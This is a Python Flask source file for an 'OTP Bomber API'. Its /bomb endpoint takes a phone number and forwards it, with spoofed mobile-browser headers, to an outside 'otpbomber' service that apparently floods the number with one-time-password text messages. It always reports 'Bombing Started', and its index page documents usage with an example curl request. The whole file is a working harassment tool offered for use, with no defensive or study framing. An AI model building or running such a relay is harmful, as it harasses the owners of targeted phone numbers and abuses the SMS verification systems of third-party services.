from flask import Flask, request, jsonify, Response
import requests
import json

app = Flask(__name__)

@app.route('/bomb', methods=['GET'])
def bomb():
    # Get phone number from query parameter
    phone_number = request.args.get('num')
    
    if not phone_number:
        return jsonify({"error": "Phone number is required"}), 400
    
    if len(phone_number) != 10 or not phone_number.isdigit():
        return jsonify({"error": "Invalid phone number format. Must be 10 digits."}), 400
    
    # Target API URL
    target_url = "https://otpbomber-40jd.onrender.com/api/bomb"
    
    # Headers from your curl command
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/json',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'origin': 'https://otpbomber-40jd.onrender.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://otpbomber-40jd.onrender.com/bomber',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'priority': 'u=1, i'
    }
    
    # Request body
    data = {
        "phone": phone_number,
        "ip": "192.168.1.1",  # Default IP
        "iterations": 1  # Default iterations
    }
    
    try:
        # Make the POST request to target API
        response = requests.post(
            target_url, 
            headers=headers, 
            json=data,  # Using json parameter instead of data=json.dumps()
            timeout=10
        )
        
        # Always return "Bombing Started" regardless of the actual API response
        # You can log the actual response if needed for debugging
        print(f"Target API Response Status: {response.status_code}")
        print(f"Target API Response: {response.text[:200]}...")  # Print first 200 chars
        
        return jsonify({
            "message": "Bombing Started",
            "status": "success",
            "target": phone_number
        })
        
    except requests.exceptions.Timeout:
        return jsonify({
            "message": "Bombing Started",
            "status": "timeout_but_initiated",
            "target": phone_number,
            "note": "Request timed out but bombing may have started"
        })
    except requests.exceptions.RequestException as e:
        return jsonify({
            "message": "Bombing Started",
            "status": "error_but_initiated",
            "target": phone_number,
            "note": f"Network error but bombing may have started: {str(e)}"
        })

@app.route('/')
def index():
    return """
    <html>
        <head>
            <title>OTP Bomber API</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    max-width: 800px;
                    margin: 0 auto;
                    padding: 20px;
                    background-color: #f5f5f5;
                }
                .container {
                    background-color: white;
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(0,0,0,0.1);
                }
                h1 {
                    color: #333;
                }
                code {
                    background-color: #eee;
                    padding: 2px 5px;
                    border-radius: 3px;
                }
                .example {
                    background-color: #f8f9fa;
                    padding: 15px;
                    border-left: 4px solid #007bff;
                    margin: 15px 0;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>OTP Bomber API</h1>
                <p>API is running. Use the following endpoint:</p>
                
                <div class="example">
                    <strong>Endpoint:</strong><br>
                    <code>GET http://babunhiho/bomb?num=PHONE_NUMBER</code>
                </div>
                
                <div class="example">
                    <strong>Example:</strong><br>
                    <code>curl "http://babunhiho/bomb?num=9876543210"</code>
                </div>
                
                <div class="example">
                    <strong>Response:</strong><br>
                    <pre>{
  "message": "Bombing Started",
  "status": "success",
  "target": "9876543210"
}</pre>
                </div>
                
                <p><strong>Note:</strong> Phone number must be 10 digits.</p>
            </div>
        </body>
    </html>
    """

